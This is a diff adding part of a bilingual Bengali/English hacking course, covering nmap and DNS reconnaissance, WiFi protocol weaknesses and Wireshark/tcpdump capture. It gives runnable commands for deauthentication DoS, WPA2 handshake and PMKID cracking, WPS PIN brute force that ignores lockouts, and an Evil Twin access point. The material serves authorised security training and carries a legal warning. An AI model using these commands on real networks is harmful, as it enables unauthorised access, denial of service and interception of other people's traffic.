+<span class="p">$</span> nmap -sU 192.168.1.1  <span class="c"># UDP scan</span>
+<span class="p">$</span> nmap -sA 192.168.1.1  <span class="c"># ACK scan (firewall mapping)</span>
+<span class="p">$</span> nmap -sN 192.168.1.1  <span class="c"># NULL scan (no flags)</span>
+<span class="p">$</span> nmap -sX 192.168.1.1  <span class="c"># Xmas scan (FIN+PSH+URG)</span>
+<span class="p">$</span> nmap -sF 192.168.1.1  <span class="c"># FIN scan</span>
+
+<span class="c"># ════ SERVICE & VERSION DETECTION ════</span>
+<span class="p">$</span> nmap -sV 192.168.1.1              <span class="c"># Service version</span>
+<span class="p">$</span> nmap -sV --version-intensity 9    <span class="c"># Aggressive version detect</span>
+<span class="p">$</span> nmap -O 192.168.1.1               <span class="c"># OS detection</span>
+<span class="p">$</span> nmap -A 192.168.1.1               <span class="c"># All: OS+version+script+traceroute</span>
+
+<span class="c"># ════ NSE SCRIPTS ════</span>
+<span class="p">$</span> nmap --script=banner 192.168.1.1           <span class="c"># Banner grabbing</span>
+<span class="p">$</span> nmap --script=vuln 192.168.1.1             <span class="c"># Vulnerability scan</span>
+<span class="p">$</span> nmap --script=http-enum 192.168.1.1        <span class="c"># HTTP enumeration</span>
+<span class="p">$</span> nmap --script=smb-vuln* 192.168.1.1        <span class="c"># SMB vulnerabilities</span>
+<span class="p">$</span> nmap --script=ftp-anon 192.168.1.1         <span class="c"># Anonymous FTP</span>
+<span class="p">$</span> nmap --script=ssh-brute 192.168.1.1        <span class="c"># SSH brute force</span>
+<span class="p">$</span> nmap --script=dns-brute domain.com         <span class="c"># DNS brute force</span>
+
+<span class="c"># ════ SPEED & TIMING ════</span>
+<span class="p">$</span> nmap -T0 target  <span class="c"># Paranoid (very slow, IDS evasion)</span>
+<span class="p">$</span> nmap -T1 target  <span class="c"># Sneaky</span>
+<span class="p">$</span> nmap -T2 target  <span class="c"># Polite</span>
+<span class="p">$</span> nmap -T3 target  <span class="c"># Normal (default)</span>
+<span class="p">$</span> nmap -T4 target  <span class="c"># Aggressive (fast)</span>
+<span class="p">$</span> nmap -T5 target  <span class="c"># Insane (very fast, may miss)</span>
+
+<span class="c"># ════ EVASION ════</span>
+<span class="p">$</span> nmap -D RND:10 192.168.1.1        <span class="c"># Decoy scan</span>
+<span class="p">$</span> nmap -S spoofed_ip 192.168.1.1    <span class="c"># Source IP spoof</span>
+<span class="p">$</span> nmap -f target                     <span class="c"># Fragment packets</span>
+<span class="p">$</span> nmap --data-length 200 target      <span class="c"># Random data padding</span>
+
+<span class="c"># ════ OUTPUT ════</span>
+<span class="p">$</span> nmap -oN scan.txt target           <span class="c"># Normal output</span>
+<span class="p">$</span> nmap -oX scan.xml target           <span class="c"># XML output</span>
+<span class="p">$</span> nmap -oG scan.grep target          <span class="c"># Grepable output</span>
+<span class="p">$</span> nmap -oA scan target               <span class="c"># All formats</span></div>
+
+    <h2 class="sec">🔎 <span class="bn-text">DNS Enumeration</span><span class="en-text">DNS Enumeration</span></h2>
+    <div class="code"><span class="c"># Basic DNS lookup</span>
+<span class="p">$</span> dig target.com ANY         <span class="c"># All records</span>
+<span class="p">$</span> dig target.com A           <span class="c"># IPv4 address</span>
+<span class="p">$</span> dig target.com AAAA        <span class="c"># IPv6 address</span>
+<span class="p">$</span> dig target.com MX          <span class="c"># Mail server</span>
+<span class="p">$</span> dig target.com NS          <span class="c"># Name servers</span>
+<span class="p">$</span> dig target.com TXT         <span class="c"># SPF, DKIM, verification</span>
+<span class="p">$</span> dig target.com SOA         <span class="c"># Start of authority</span>
+<span class="p">$</span> dig -x 8.8.8.8             <span class="c"># Reverse lookup (PTR)</span>
+
+<span class="c"># Zone Transfer চেষ্টা (misconfigured DNS)</span>
+<span class="p">$</span> dig axfr target.com @ns1.target.com
+<span class="p">$</span> host -l target.com ns1.target.com
+
+<span class="c"># Subdomain Brute Force</span>
+<span class="p">$</span> gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+<span class="p">$</span> dnsenum target.com
+<span class="p">$</span> dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt
+<span class="p">$</span> amass enum -d target.com   <span class="c"># Passive + active</span>
+
+<span class="c"># Fierce — automated DNS recon</span>
+<span class="p">$</span> fierce --domain target.com</div>
+
+    <h2 class="sec">🌐 <span class="bn-text">Network Discovery Tools</span><span class="en-text">Network Discovery Tools</span></h2>
+    <div class="code"><span class="c"># netdiscover — ARP based host discovery</span>
+<span class="p">$</span> netdiscover -r 192.168.1.0/24        <span class="c"># Active scan</span>
+<span class="p">$</span> netdiscover -p                        <span class="c"># Passive (just listen)</span>
+<span class="p">$</span> netdiscover -i eth0 -r 10.0.0.0/24
+
+<span class="c"># arp-scan</span>
+<span class="p">$</span> arp-scan --localnet
+<span class="p">$</span> arp-scan -I eth0 192.168.1.0/24
+
+<span class="c"># masscan — ultra-fast internet scanner</span>
+<span class="p">$</span> masscan -p80,443 192.168.1.0/24 --rate=1000
+<span class="p">$</span> masscan -p0-65535 10.0.0.0/8 --rate=10000
+
+<span class="c"># nbtscan — NetBIOS scan (Windows networks)</span>
+<span class="p">$</span> nbtscan 192.168.1.0/24
+
+<span class="c"># Shodan CLI (internet-wide)</span>
+<span class="p">$</span> shodan search "apache 2.4" country:BD
+<span class="p">$</span> shodan host 8.8.8.8
+<span class="p">$</span> shodan search port:22 default password</div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 2 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">Passive vs Active recon — কখন কোনটা ব্যবহার করবে</span></li>
+        <li>✔ <span class="bn-text">Nmap-এর সব important flag মুখস্থ করো</span></li>
+        <li>✔ <span class="bn-text">DNS zone transfer — misconfigured server থেকে সব subdomain</span></li>
+        <li>✔ <span class="bn-text">netdiscover/arp-scan — local network-এ live host বের করো</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH3: WIRELESS SECURITY PROTOCOLS -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 03</div>
+    <div class="chapter-title">📶 <span class="bn-text">Wireless Security Protocols</span><span class="en-text">Wireless Security Protocols</span></div>
+    <div class="chapter-desc"><span class="bn-text">WEP থেকে WPA3 — WiFi encryption-এর সম্পূর্ণ ইতিহাস ও দুর্বলতা</span><span class="en-text">WEP to WPA3 — complete history and weaknesses of WiFi encryption</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📡 <span class="bn-text">802.11 WiFi Standards</span><span class="en-text">802.11 WiFi Standards</span></h2>
+    <table>
+      <thead><tr><th>Standard</th><th>Name</th><th>Frequency</th><th>Max Speed</th><th>Range</th></tr></thead>
+      <tbody>
+        <tr><td><strong>802.11b</strong></td><td>WiFi 1</td><td>2.4 GHz</td><td>11 Mbps</td><td>35m indoor</td></tr>
+        <tr><td><strong>802.11a</strong></td><td>WiFi 2</td><td>5 GHz</td><td>54 Mbps</td><td>35m indoor</td></tr>
+        <tr><td><strong>802.11g</strong></td><td>WiFi 3</td><td>2.4 GHz</td><td>54 Mbps</td><td>38m indoor</td></tr>
+        <tr><td><strong>802.11n</strong></td><td>WiFi 4</td><td>2.4/5 GHz</td><td>600 Mbps</td><td>70m indoor</td></tr>
+        <tr><td><strong>802.11ac</strong></td><td>WiFi 5</td><td>5 GHz</td><td>3.5 Gbps</td><td>35m indoor</td></tr>
+        <tr><td><strong>802.11ax</strong></td><td>WiFi 6</td><td>2.4/5/6 GHz</td><td>9.6 Gbps</td><td>Indoor+outdoor</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔓 <span class="bn-text">WEP — Wired Equivalent Privacy (ভেঙে পড়া)</span><span class="en-text">WEP — Wired Equivalent Privacy (Broken)</span></h2>
+    <p><span class="bn-text">WEP ছিল WiFi-এর প্রথম security standard (1997)। এটা RC4 cipher ব্যবহার করে কিন্তু IV (Initialization Vector) মাত্র 24-bit — ফলে same IV repeat হয় এবং পুরো encryption ভেঙে পড়ে।</span><span class="en-text">WEP was the first WiFi security standard (1997). It uses RC4 cipher but with only a 24-bit IV — causing IV repetition that breaks the entire encryption.</span></p>
+    <div class="grid2">
+      <div class="card">
+        <h4>❌ <span class="bn-text">WEP-এর দুর্বলতা</span><span class="en-text">WEP Weaknesses</span></h4>
+        <ul>
+          <li><span class="bn-text">IV মাত্র 24-bit — collision inevitable</span></li>
+          <li><span class="bn-text">Static key — একবার জানলে সব decrypt</span></li>
+          <li><span class="bn-text">RC4 keystream reuse vulnerability</span></li>
+          <li><span class="bn-text">~50,000 packets দিয়েই crack করা যায়</span></li>
+          <li><span class="bn-text">aircrack-ng দিয়ে মিনিটের মধ্যে crack</span></li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>🔧 <span class="bn-text">WEP Crack Tool</span></h4>
+        <ul>
+          <li><code>aircrack-ng</code> — primary tool</li>
+          <li><code>aireplay-ng</code> — packet injection</li>
+          <li><code>airodump-ng</code> — capture</li>
+          <li><span class="bn-text">আজকাল WEP নেটওয়ার্ক প্রায় নেই</span></li>
+          <li><span class="badge badge-r">⛔ 2003 থেকে deprecated</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🔐 <span class="bn-text">WPA — WiFi Protected Access</span><span class="en-text">WPA — WiFi Protected Access</span></h2>
+    <p><span class="bn-text">WPA (2003) WEP-এর জায়গায় এলো। TKIP (Temporal Key Integrity Protocol) ব্যবহার করে। প্রতিটা packet-এ আলাদা key generate হয়। কিন্তু এটাও WPA2 এর চেয়ে দুর্বল।</span><span class="en-text">WPA (2003) replaced WEP. Uses TKIP (Temporal Key Integrity Protocol). Generates a different key per packet. But still weaker than WPA2.</span></p>
+    <div class="code"><span class="c">WPA Authentication Modes:</span>
+
+<span class="g">WPA-Personal (WPA-PSK)</span>
+  └─ Pre-Shared Key — home/small office
+  └─ Password থেকে PMK (Pairwise Master Key) তৈরি হয়
+  └─ 4-way handshake দিয়ে authenticate হয়
+  └─ Handshake capture করে offline crack করা যায়
+
+<span class="g">WPA-Enterprise (WPA-802.1X)</span>
+  └─ RADIUS server ব্যবহার করে
+  └─ প্রতিটা user-এর আলাদা credential
+  └─ Corporate networks-এ ব্যবহার হয়
+  └─ Crack করা অনেক কঠিন
+
+<span class="c">WPA Encryption:</span>
+  TKIP  → RC4-based, per-packet key mixing
+  CCMP  → AES-based (optional in WPA, mandatory in WPA2)</div>
+
+    <h2 class="sec">🔒 <span class="bn-text">WPA2 — Current Standard</span><span class="en-text">WPA2 — Current Standard</span></h2>
+    <p><span class="bn-text">WPA2 (2004) সবচেয়ে বেশি ব্যবহৃত WiFi security protocol। AES-CCMP encryption ব্যবহার করে যা অনেক শক্তিশালী। Primary attack vector হলো 4-way handshake capture করে offline dictionary/brute force attack।</span><span class="en-text">WPA2 (2004) is the most widely used WiFi security protocol. Uses AES-CCMP encryption which is very strong. Primary attack vector is capturing the 4-way handshake for offline dictionary/brute force attack.</span></p>
+
+    <div class="code"><span class="c">WPA2 4-Way Handshake Process:</span>
+
+AP (Router)                   Client
+    |                              |
+    |  ←──── Association req ──── |  <span class="c">Client joins network</span>
+    |  ────  Association resp ───→ |
+    |                              |
+    |  ─── MSG1: ANonce ─────────→ |  <span class="c">AP sends random nonce</span>
+    |  ←── MSG2: SNonce+MIC ───── |  <span class="c">Client sends nonce+MIC</span>
+    |  ─── MSG3: GTK+MIC ────────→ |  <span class="c">AP sends group key</span>
+    |  ←── MSG4: ACK ────────────  |  <span class="c">Client confirms</span>
+    |                              |
+    |  [Encrypted communication]   |
+
+<span class="c"># Attack: MSG1+MSG2 (অথবা MSG2+MSG3) capture করলেই যথেষ্ট</span>
+<span class="c"># PTK (Pairwise Transient Key) = PBKDF2(PSK, SSID, ANonce, SNonce, MAC)</span>
+<span class="c"># MIC (Message Integrity Code) verify করে password সঠিক কিনা</span></div>
+
+    <div class="info box">ℹ️ <strong><span class="bn-text">PMKID Attack (2018):</span></strong> <span class="bn-text">Handshake capture ছাড়াই সরাসরি AP-এর PMKID থেকে password crack করা যায়। Client-এর উপস্থিতি লাগে না। hcxdumptool দিয়ে PMKID capture করো।</span><span class="en-text">Without capturing a handshake, you can crack the password directly from the AP's PMKID. No client needed. Use hcxdumptool to capture PMKID.</span></div>
+
+    <h2 class="sec">🛡️ <span class="bn-text">WPA3 — Latest ও Most Secure</span><span class="en-text">WPA3 — Latest & Most Secure</span></h2>
+    <table>
+      <thead><tr><th><span class="bn-text">Feature</span></th><th>WPA2</th><th>WPA3</th></tr></thead>
+      <tbody>
+        <tr><td><span class="bn-text">Key Exchange</span></td><td>PSK (4-way handshake)</td><td>SAE (Dragonfly) — dictionary attack resist</td></tr>
+        <tr><td><span class="bn-text">Forward Secrecy</span></td><td>❌ নেই</td><td>✅ আছে — পুরানো traffic safe</td></tr>
+        <tr><td><span class="bn-text">Offline Dictionary Attack</span></td><td>✅ সম্ভব</td><td>❌ সম্ভব না (online only)</td></tr>
+        <tr><td><span class="bn-text">PMKID Attack</span></td><td>✅ সম্ভব</td><td>❌ সম্ভব না</td></tr>
+        <tr><td><span class="bn-text">Open Network Encryption</span></td><td>❌ নেই</td><td>✅ OWE (Opportunistic Wireless Encryption)</td></tr>
+        <tr><td><span class="bn-text">Enterprise Encryption</span></td><td>128-bit</td><td>192-bit (CNSA suite)</td></tr>
+        <tr><td><span class="bn-text">Known Weakness</span></td><td>Handshake crack</td><td>Dragonblood (side-channel, পুরানো impl.)</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔑 <span class="bn-text">WPS — WiFi Protected Setup</span><span class="en-text">WPS — WiFi Protected Setup</span></h2>
+    <p><span class="bn-text">WPS একটা সহজ connection mechanism — 8-digit PIN দিয়ে connect করা যায়। কিন্তু PIN দুই ভাগে verify হয় (4+4 digit), তাই মাত্র 11,000 combination try করলেই PIN বের করা যায়।</span><span class="en-text">WPS is a simple connection mechanism using an 8-digit PIN. But the PIN is verified in two halves (4+4 digits), so only ~11,000 combinations need to be tried to find the PIN.</span></p>
+    <div class="code"><span class="c"># WPS PIN attack</span>
+<span class="p">$</span> wash -i wlan0mon                    <span class="c"># WPS-enabled networks খোঁজো</span>
+<span class="p">$</span> reaver -i wlan0mon -b BSSID -vv     <span class="c"># WPS PIN brute force</span>
+<span class="p">$</span> bully -b BSSID -e ESSID -c CH wlan0mon  <span class="c"># Alternative to reaver</span>
+
+<span class="c"># WPS Lock চেক (3 failed attempts = lock)</span>
+<span class="p">$</span> reaver -i wlan0mon -b BSSID -L      <span class="c"># Ignore locks</span>
+<span class="p">$</span> reaver -i wlan0mon -b BSSID -d 30   <span class="c"># 30s delay between attempts</span>
+
+<span class="c"># PixieDust Attack (offline WPS crack)</span>
+<span class="p">$</span> reaver -i wlan0mon -b BSSID -K 1    <span class="c"># Pixie mode</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 3 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">WEP → RC4 + 24-bit IV → completely broken</span></li>
+        <li>✔ <span class="bn-text">WPA → TKIP → handshake capture করে offline crack</span></li>
+        <li>✔ <span class="bn-text">WPA2 → AES-CCMP → 4-way handshake + PMKID attack</span></li>
+        <li>✔ <span class="bn-text">WPA3 → SAE → offline crack সম্ভব না</span></li>
+        <li>✔ <span class="bn-text">WPS → 8-digit PIN → ~11,000 try-তেই crack</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH4: WIRELESS ATTACKS -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 04</div>
+    <div class="chapter-title">⚔️ <span class="bn-text">Wireless Attacks</span><span class="en-text">Wireless Attacks</span></div>
+    <div class="chapter-desc"><span class="bn-text">Monitor Mode, Handshake Capture, Deauth, Evil Twin — সব Wireless Attack</span><span class="en-text">Monitor Mode, Handshake Capture, Deauth, Evil Twin — all Wireless Attacks</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="danger box">🚨 <strong><span class="bn-text">শুধুমাত্র নিজের network বা authorized lab-এ practice করো। অন্যের WiFi crack করা বাংলাদেশে ICT Act-এ অপরাধ।</span><span class="en-text">Practice only on your own network or authorized lab. Cracking others' WiFi is a crime under the ICT Act in Bangladesh.</span></strong></div>
+
+    <h2 class="sec">📡 <span class="bn-text">Monitor Mode Setup</span><span class="en-text">Monitor Mode Setup</span></h2>
+    <p><span class="bn-text">Monitor Mode মানে wireless adapter সব packets capture করতে পারে — শুধু নিজের network না। এটা enable না করলে WiFi attack করা যায় না।</span><span class="en-text">Monitor Mode means the wireless adapter can capture all packets — not just your own network. WiFi attacks are impossible without enabling this.</span></p>
+    <div class="code"><span class="c"># Compatible adapter দরকার (internal WiFi কাজ করে না)</span>
+<span class="c"># Recommended: Alfa AWUS036ACH, AWUS036NHA, TP-Link TL-WN722N</span>
+
+<span class="c"># Method 1: airmon-ng (সহজ)</span>
+<span class="p">$</span> airmon-ng check kill        <span class="c"># Conflicting processes kill করো</span>
+<span class="p">$</span> airmon-ng start wlan0        <span class="c"># Monitor mode ON → wlan0mon তৈরি হবে</span>
+<span class="p">$</span> airmon-ng stop wlan0mon      <span class="c"># Monitor mode OFF</span>
+
+<span class="c"># Method 2: iw (manual)</span>
+<span class="p">$</span> ip link set wlan0 down
+<span class="p">$</span> iw dev wlan0 set type monitor
+<span class="p">$</span> ip link set wlan0 up
+
+<span class="c"># Method 3: iwconfig</span>
+<span class="p">$</span> ifconfig wlan0 down
+<span class="p">$</span> iwconfig wlan0 mode monitor
+<span class="p">$</span> ifconfig wlan0 up
+
+<span class="c"># Verify করো</span>
+<span class="p">$</span> iwconfig wlan0mon
+<span class="g">wlan0mon  IEEE 802.11  Mode:Monitor</span>
+
+<span class="c"># Specific channel-এ lock করো</span>
+<span class="p">$</span> iwconfig wlan0mon channel 6
+<span class="p">$</span> iw dev wlan0mon set channel 6</div>
+
+    <h2 class="sec">🎯 <span class="bn-text">airodump-ng — Network Discovery</span><span class="en-text">airodump-ng — Network Discovery</span></h2>
+    <div class="code"><span class="c"># সব WiFi networks দেখো</span>
+<span class="p">$</span> airodump-ng wlan0mon
+
+<span class="c"># Output এ কী দেখাবে:</span>
+<span class="c"> BSSID              PWR  Beacons  #Data  CH  MB  ENC  CIPHER AUTH ESSID</span>
+<span class="c"> AA:BB:CC:DD:EE:FF  -65      234     12   6   54  WPA2 CCMP   PSK  MyNetwork</span>
+<span class="c"> 11:22:33:44:55:66  -80       45      0  11  130  WPA2 CCMP   PSK  Neighbor</span>
+
+<span class="c"># Specific network-এ focus করো</span>
+<span class="p">$</span> airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+<span class="c">#           channel↑  target BSSID↑            output file↑</span>
+
+<span class="c"># Output files তৈরি হবে:</span>
+<span class="c"># capture-01.cap    ← handshake এখানে থাকবে</span>
+<span class="c"># capture-01.csv    ← CSV data</span>
+<span class="c"># capture-01.kismet.netxml</span>
+
+<span class="c"># Connected clients দেখো</span>
+<span class="c"> STATION            PWR  Rate  Lost  Frames  Probe</span>
+<span class="c"> FF:EE:DD:CC:BB:AA  -55  54-54    0      45  MyNetwork</span></div>
+
+    <h2 class="sec">💥 <span class="bn-text">Deauthentication Attack</span><span class="en-text">Deauthentication Attack</span></h2>
+    <p><span class="bn-text">Deauth attack-এ forged deauthentication frame পাঠিয়ে client-কে disconnect করা হয়। Client reconnect করার সময় 4-way handshake capture করা যায়।</span><span class="en-text">A deauth attack forces a client to disconnect by sending forged deauthentication frames. The 4-way handshake can be captured when the client reconnects.</span></p>
+    <div class="code"><span class="c"># Deauth পাঠাও → client disconnect হবে → reconnect করবে → handshake capture হবে</span>
+
+<span class="c"># All clients-কে deauth করো</span>
+<span class="p">$</span> aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+<span class="c">#          ↑deauth count  ↑target AP BSSID</span>
+
+<span class="c"># Specific client-কে deauth করো</span>
+<span class="p">$</span> aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon
+<span class="c">#                    ↑AP BSSID                ↑Client MAC</span>
+
+<span class="c"># Continuous deauth (DOS)</span>
+<span class="p">$</span> aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+<span class="c"># 0 = infinite — client কখনো connect করতে পারবে না</span>
+
+<span class="c"># Terminal 1: airodump চালাও (capture mode)</span>
+<span class="p">$</span> airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+<span class="c"># Terminal 2: deauth পাঠাও</span>
+<span class="p">$</span> aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="c"># Terminal 1-এ দেখবে:</span>
+<span class="g">WPA handshake: AA:BB:CC:DD:EE:FF</span></div>
+
+    <h2 class="sec">🔓 <span class="bn-text">WPA2 Handshake Cracking</span><span class="en-text">WPA2 Handshake Cracking</span></h2>
+    <div class="code"><span class="c"># Method 1: aircrack-ng (Dictionary attack)</span>
+<span class="p">$</span> aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
+<span class="p">$</span> aircrack-ng handshake-01.cap -w passwords.txt -e "NetworkName"
+
+<span class="c"># Method 2: hashcat (GPU — much faster!)</span>
+<span class="c"># .cap → .hc22000 format convert</span>
+<span class="p">$</span> hcxpcapngtool -o hash.hc22000 handshake-01.cap
+
+<span class="c"># hashcat দিয়ে crack</span>
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  <span class="c"># 8-digit brute force</span>
+
+<span class="c"># Method 3: PMKID Attack (client না থাকলেও)</span>
+<span class="p">$</span> hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+<span class="p">$</span> hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt
+
+<span class="c"># Custom wordlist তৈরি</span>
+<span class="p">$</span> crunch 8 8 0123456789 -o 8digit.txt       <span class="c"># 8-digit numbers</span>
+<span class="p">$</span> crunch 8 10 abcdefghijklmnopqrstuvwxyz     <span class="c"># Lowercase 8-10 chars</span>
+
+<span class="c"># hashcat masks</span>
+<span class="c"># ?l = lowercase  ?u = uppercase  ?d = digit  ?s = special</span>
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?d?d?d?d  <span class="c"># 4 letters + 4 digits</span></div>
+
+    <h2 class="sec">👿 <span class="bn-text">Evil Twin Attack</span><span class="en-text">Evil Twin Attack</span></h2>
+    <p><span class="bn-text">Evil Twin মানে victim network-এর নামে একটা fake AP তৈরি করা। Victim connect করলে তার traffic আমাদের দিয়ে যাবে।</span><span class="en-text">Evil Twin means creating a fake AP with the same name as the victim's network. When the victim connects, their traffic flows through us.</span></p>
+    <div class="code"><span class="c"># hostapd দিয়ে fake AP তৈরি</span>
+<span class="c"># /etc/hostapd/fake.conf</span>
+interface=wlan0
+driver=nl80211
+ssid=FreeWiFi          <span class="c"># Target network-এর নাম</span>
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+
+<span class="p">$</span> hostapd /etc/hostapd/fake.conf
+
+<span class="c"># DHCP server setup (dnsmasq)</span>
+<span class="p">$</span> dnsmasq --interface=wlan0 --dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h \
+          --no-resolv --server=8.8.8.8
+
+<span class="c"># IP Forwarding enable করো</span>
+<span class="p">$</span> echo 1 > /proc/sys/net/ipv4/ip_forward
+<span class="p">$</span> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+<span class="c"># Automated: hostapd-wpe (WPA Enterprise attack)</span>
+<span class="p">$</span> hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+<span class="c"># airbase-ng দিয়ে (simpler)</span>
+<span class="p">$</span> airbase-ng -a AA:BB:CC:DD:EE:FF -e "TargetSSID" -c 6 wlan0mon</div>
+
+    <h2 class="sec">🔧 <span class="bn-text">Wireless Attack Toolkit Summary</span><span class="en-text">Wireless Attack Toolkit Summary</span></h2>
+    <table>
+      <thead><tr><th>Tool</th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th><th>Command</th></tr></thead>
+      <tbody>
+        <tr><td><strong>airmon-ng</strong></td><td><span class="bn-text">Monitor mode</span></td><td><code>airmon-ng start wlan0</code></td></tr>
+        <tr><td><strong>airodump-ng</strong></td><td><span class="bn-text">Network scan ও capture</span></td><td><code>airodump-ng wlan0mon</code></td></tr>
+        <tr><td><strong>aireplay-ng</strong></td><td><span class="bn-text">Packet injection, deauth</span></td><td><code>aireplay-ng -0 5 -a BSSID wlan0mon</code></td></tr>
+        <tr><td><strong>aircrack-ng</strong></td><td><span class="bn-text">WEP/WPA crack (CPU)</span></td><td><code>aircrack-ng cap.cap -w wordlist</code></td></tr>
+        <tr><td><strong>hashcat</strong></td><td><span class="bn-text">WPA crack (GPU, fast)</span></td><td><code>hashcat -m 22000 hash rockyou.txt</code></td></tr>
+        <tr><td><strong>hcxdumptool</strong></td><td><span class="bn-text">PMKID capture</span></td><td><code>hcxdumptool -i wlan0mon -o out.pcapng</code></td></tr>
+        <tr><td><strong>reaver</strong></td><td><span class="bn-text">WPS PIN attack</span></td><td><code>reaver -i wlan0mon -b BSSID -vv</code></td></tr>
+        <tr><td><strong>wash</strong></td><td><span class="bn-text">WPS enabled AP খোঁজো</span></td><td><code>wash -i wlan0mon</code></td></tr>
+        <tr><td><strong>wifite</strong></td><td><span class="bn-text">Automated WiFi attack</span></td><td><code>wifite</code></td></tr>
+        <tr><td><strong>fern-wifi-cracker</strong></td><td><span class="bn-text">GUI WiFi cracker</span></td><td><code>fern-wifi-cracker</code></td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 4 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">Monitor mode = wireless attack-এর প্রথম ধাপ</span></li>
+        <li>✔ <span class="bn-text">airodump-ng দিয়ে scan → aireplay-ng দিয়ে deauth → handshake capture</span></li>
+        <li>✔ <span class="bn-text">aircrack-ng (CPU) vs hashcat (GPU) — hashcat অনেক দ্রুত</span></li>
+        <li>✔ <span class="bn-text">PMKID attack = client ছাড়াই WPA2 crack</span></li>
+        <li>✔ <span class="bn-text">WPS attack = ~11,000 try-তেই PIN বের হয়</span></li>
+        <li>✔ <span class="bn-text">Evil Twin = fake AP দিয়ে victim-এর traffic intercept</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH5: PACKET SNIFFING -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 05</div>
+    <div class="chapter-title">👃 <span class="bn-text">Packet Sniffing ও Analysis</span><span class="en-text">Packet Sniffing & Analysis</span></div>
+    <div class="chapter-desc"><span class="bn-text">Wireshark, tcpdump, Scapy — Network traffic দেখা ও বিশ্লেষণ</span><span class="en-text">Wireshark, tcpdump, Scapy — Viewing and analyzing network traffic</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🦈 <span class="bn-text">Wireshark — GUI Packet Analyzer</span><span class="en-text">Wireshark — GUI Packet Analyzer</span></h2>
+    <div class="code"><span class="c"># Wireshark start করো</span>
+<span class="p">$</span> wireshark &
+<span class="p">$</span> wireshark -i eth0 &          <span class="c"># Specific interface</span>
+<span class="p">$</span> wireshark -r capture.pcap &  <span class="c"># Saved file open</span>
+
+<span class="c">═══ DISPLAY FILTERS (সবচেয়ে গুরুত্বপূর্ণ) ═══</span>
+
+<span class="c"># Protocol filter</span>
+http             <span class="c"># শুধু HTTP traffic</span>
+dns              <span class="c"># শুধু DNS queries</span>
+tcp              <span class="c"># শুধু TCP</span>
+udp              <span class="c"># শুধু UDP</span>
+icmp             <span class="c"># ICMP (ping)</span>
+arp              <span class="c"># ARP packets</span>
+ssl or tls       <span class="c"># Encrypted traffic</span>
+ftp              <span class="c"># FTP</span>
+ssh              <span class="c"># SSH</span>
+smb              <span class="c"># SMB file sharing</span>
+
+<span class="c"># IP filter</span>
+ip.addr == 192.168.1.1            <span class="c"># Specific IP (src বা dst)</span>
+ip.src == 192.168.1.100           <span class="c"># Source IP</span>
+ip.dst == 8.8.8.8                 <span class="c"># Destination IP</span>
+ip.addr == 192.168.1.0/24         <span class="c"># Entire subnet</span>
+
+<span class="c"># Port filter</span>
+tcp.port == 80                    <span class="c"># TCP port 80</span>
+tcp.dstport == 443                <span class="c"># Destination port</span>
+tcp.port == 22 or tcp.port == 80  <span class="c"># Multiple ports</span>
+
+<span class="c"># Content filter</span>
+http.request.method == "POST"     <span class="c"># HTTP POST শুধু</span>
+http.request.uri contains "login" <span class="c"># URL-এ login আছে</span>
+frame contains "password"        <span class="c"># Packet-এ password শব্দ</span>
+dns.qry.name contains "google"   <span class="c"># DNS query</span>
+
+<span class="c"># Combination</span>
+http and ip.src == 192.168.1.100
+tcp.port == 80 and !ip.addr == 192.168.1.1
+http.request.method == "POST" and http contains "password"</div>
+
+    <h2 class="sec">🖥️ <span class="bn-text">tcpdump — CLI Packet Capture</span><span class="en-text">tcpdump — CLI Packet Capture</span></h2>
+    <div class="code"><span class="c"># Basic capture</span>
+<span class="p">$</span> tcpdump -i eth0                   <span class="c"># eth0-এ capture</span>
+<span class="p">$</span> tcpdump -i any                    <span class="c"># সব interface</span>
+<span class="p">$</span> tcpdump -i eth0 -w output.pcap    <span class="c"># File-এ save</span>
